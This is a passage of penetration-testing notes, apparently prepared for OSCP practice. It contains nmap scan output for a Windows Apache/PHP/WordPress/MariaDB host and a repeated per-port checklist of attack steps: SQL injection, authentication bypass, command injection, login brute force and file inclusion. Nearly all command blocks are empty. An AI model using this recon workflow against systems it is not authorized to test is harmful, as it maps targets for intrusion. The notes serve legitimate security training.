80/tcp   open  http     Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Shoppr
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
81/tcp   open  http     Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.9
|_http-title: OSCP
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
443/tcp  open  ssl/http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2025-12-12 05:51  site1/
| 1.0K  2025-12-08 16:13  site1/composer.json
| 39K   2025-12-04 16:36  site1/composer.lock
| 2.4K  2025-12-09 00:47  site1/config.json
| -     2025-12-12 06:33  site1/logs/
| -     2025-12-12 05:51  site1/public/
| -     2025-12-12 05:51  site1/src/
| -     2025-12-12 05:51  site1/templates/
| -     2025-12-12 05:51  site1/vendor/
| -     2025-12-12 05:51  site2/
|_
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Index of /
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
Service Info: Host: www.example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.91 seconds

```

### \[\[MYSQL 3306]] -- Scans

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

# Web Recon 80

### \[\[WebSite Directory BurteForce]]

```
```

### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]

```
whatweb http://example.com to find the version
```

### \[\[git recon]]

```
```

> Login page

### \[\[SQL Injection (SQLi)]]

```
```

### \[\[Authentication 繞過]]

```
```

### \[\[OS Command Injection 命令注入]]

```
```

### \[\[登入爆破]]

```
```

> Inquiry Function

### \[\[SQL Injection (SQLi)]]

```
```

### \[\[Local File Inclusion (LFI)(RFI)]]

```
```

***

# Web Recon 443

### \[\[WebSite Directory BurteForce]]

```
```

### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]

```
whatweb http://example.com to find the version
```

### \[\[git recon]]

```
```

> Login page

### \[\[SQL Injection (SQLi)]]

```
```

### \[\[Authentication 繞過]]

```
```

### \[\[OS Command Injection 命令注入]]

```
```

### \[\[登入爆破]]

```
```

> Inquiry Function

### \[\[SQL Injection (SQLi)]]

```
```

### \[\[Local File Inclusion (LFI)(RFI)]]

```
```

***

# Web Recon 81

### \[\[WebSite Directory BurteForce]]

```
```

### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]

```
whatweb http://example.com to find the version
```

### \[\[git recon]]

```
```

> Login page

### \[\[SQL Injection (SQLi)]]

```
```

### \[\[Authentication 繞過]]

```
```

### \[\[OS Command Injection 命令注入]]

```
```

### \[\[登入爆破]]

```
```

> Inquiry Function

### \[\[SQL Injection (SQLi)]]

```
```

### \[\[Local File Inclusion (LFI)(RFI)]]

```
```

***

***

***
